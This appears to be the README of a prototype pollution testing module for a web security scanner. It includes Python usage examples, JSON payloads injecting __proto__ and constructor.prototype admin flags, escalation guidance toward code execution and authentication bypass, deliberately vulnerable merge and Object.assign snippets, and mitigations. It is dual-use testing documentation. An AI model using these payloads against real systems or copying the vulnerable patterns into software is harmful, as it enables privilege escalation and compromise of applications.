# Prototype Pollution Module

## Overview

The Prototype Pollution module provides automated testing for prototype pollution vulnerabilities in JavaScript/Node.js applications. It tests multiple injection points and techniques to identify vulnerabilities and provides escalation guidance for exploitation.

## Features

- **Multiple Injection Techniques**:
  - `__proto__` property injection
  - `constructor.prototype` injection
  - Array-based `__proto__[]` injection
  - Nested object pollution

- **Multiple Injection Points**:
  - Query parameters
  - POST body parameters
  - JSON request body
  - HTTP headers
  - Cookies

- **Verification Methods**:
  - Detects unexpected properties in responses
  - Identifies pollution indicators in JSON/JavaScript output
  - Compares against baseline responses

- **Escalation Guidance**:
  - Remote Code Execution (RCE) paths
  - Authentication bypass techniques
  - Denial of Service (DoS) vectors
  - Cross-Site Scripting (XSS) opportunities

## Usage

### Basic Usage

```python
from app.modules.prototype_pollution import (
    PrototypePollutionTester,
    InjectionPoint,
    InjectionLocation,
    create_injection_points_from_request,
)
from app.core.request_handler import RequestHandler

# Initialize
request_handler = RequestHandler()
tester = PrototypePollutionTester(request_handler)

# Create injection point
injection_point = InjectionPoint(
    parameter="user",
    location=InjectionLocation.JSON_BODY,
    original_value='{"name": "test"}',
    url="https://target.com/api/user",
    method="POST",
    json_data={"name": "test"},
)

# Test for prototype pollution
results = await tester.test_injection_point(injection_point)

# Check results
for result in results:
    if result.is_vulnerable:
        print(f"Vulnerable! Technique: {result.technique.value}")
        print(f"Polluted property: {result.polluted_property}")
        print(f"Payload: {result.payload}")
        print("\nEscalation guidance:")
        for guidance in result.escalation_paths:
            print(guidance)
```

### Testing Multiple Injection Points

```python
# Create injection points from request
injection_points = create_injection_points_from_request(
    url="https://target.com/api/update",
    method="POST",
    query_params={"id": "123"},
    json_data={"user": {"name": "test", "email": "test@example.com"}},
    headers={"Content-Type": "application/json"},
)

# Test all injection points
all_results = []
for injection_point in injection_points:
    results = await tester.test_injection_point(injection_point)
    all_results.extend(results)

# Filter vulnerable results
vulnerable = [r for r in all_results if r.is_vulnerable]
print(f"Found {len(vulnerable)} vulnerable injection points")
```

### Testing Specific Techniques

```python
from app.modules.prototype_pollution import PollutionTechnique

# Test only __proto__ injection
results = await tester.test_injection_point(
    injection_point,
    techniques=[PollutionTechnique.PROTO_PROPERTY],
)

# Test multiple specific techniques
results = await tester.test_injection_point(
    injection_point,
    techniques=[
        PollutionTechnique.PROTO_PROPERTY,
        PollutionTechnique.CONSTRUCTOR_PROTOTYPE,
    ],
)
```

## Pollution Techniques

### 1. __proto__ Property Injection

Directly pollutes the prototype chain using the `__proto__` property:

```json
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}
```

### 2. constructor.prototype Injection

Pollutes via the constructor's prototype:

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

### 3. Array-based Injection

Uses array notation for pollution:

```json
{
  "__proto__[isAdmin]": "true",
  "__proto__[role]": "admin"
}
```

### 4. Nested Object Pollution

Pollutes through nested object structures:

```json
{
  "user": {
    "settings": {
      "__proto__": {
        "isAdmin": true
      }
    }
  }
}
```

## Detection Methods

The module detects prototype pollution by:

1. **Property Reflection**: Checking if injected properties appear in responses
2. **Pattern Matching**: Looking for pollution indicators in JSON/JavaScript output
3. **Baseline Comparison**: Comparing responses against baseline to identify new properties
4. **Error Analysis**: Detecting error messages that reveal pollution

## Escalation Paths

### Remote Code Execution (RCE)

- Pollute `shell` property for command injection in `child_process.spawn()`
- Inject environment variables via `env` property
- Target template engines by polluting rendering properties
- Inject `NODE_OPTIONS` for process-level code execution

### Authentication Bypass

- Pollute `isAdmin`, `role`, or `authenticated` properties
- Target session properties like `userId` or `permissions`
- Inject JWT claim properties
- Override authentication middleware checks

### Denial of Service (DoS)

- Pollute `toString` or `valueOf` to cause crashes
- Break object instantiation via `constructor` pollution
- Cause infinite loops by polluting array methods

### Cross-Site Scripting (XSS)

- Pollute properties used in HTML rendering
- Target `innerHTML` or `outerHTML` properties
- Inject script tags through polluted properties

## Example Payloads

### Basic Admin Bypass

```json
{
  "username": "attacker",
  "__proto__": {
    "isAdmin": true,
    "role": "administrator"
  }
}
```

### Nested Pollution

```json
{
  "user": {
    "profile": {
      "__proto__": {
        "authenticated": true,
        "permissions": ["read", "write", "admin"]
      }
    }
  }
}
```

### Constructor Pollution

```json
{
  "data": {
    "constructor": {
      "prototype": {
        "isAdmin": true,
        "bypassAuth": true
      }
    }
  }
}
```

## Testing Recommendations

1. **Test Multiple Injection Points**: Query params, POST data, JSON body, headers
2. **Verify Persistence**: Check if pollution persists across requests
3. **Test Different Techniques**: Try all pollution techniques
4. **Monitor Side Effects**: Watch for unexpected application behavior
5. **Check Cross-User Impact**: Verify if pollution affects other users

## Common Vulnerable Patterns

### Merge Operations

```javascript
// Vulnerable: Deep merge without prototype protection
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

### Object Assignment

```javascript
// Vulnerable: Direct assignment from user input
app.post('/update', (req, res) => {
  Object.assign(user, req.body);
});
```

### JSON Parsing

```javascript
// Vulnerable: Parsing untrusted JSON
const userData = JSON.parse(req.body);
Object.assign(user, userData);
```

## Mitigation

- Use `Object.create(null)` for objects without prototype
- Freeze `Object.prototype` with `Object.freeze(Object.prototype)`
- Validate and sanitize all user input
- Use safe merge libraries with prototype protection
- Implement allowlists for object properties
- Use `Map` instead of plain objects for user data

## References

- [Prototype Pollution Attack](https://portswigger.net/web-security/prototype-pollution)
- [Prototype Pollution in Node.js](https://github.com/HoLyVieR/prototype-pollution-nsec18)
- [Exploiting Prototype Pollution](https://blog.s1r1us.ninja/research/PP)
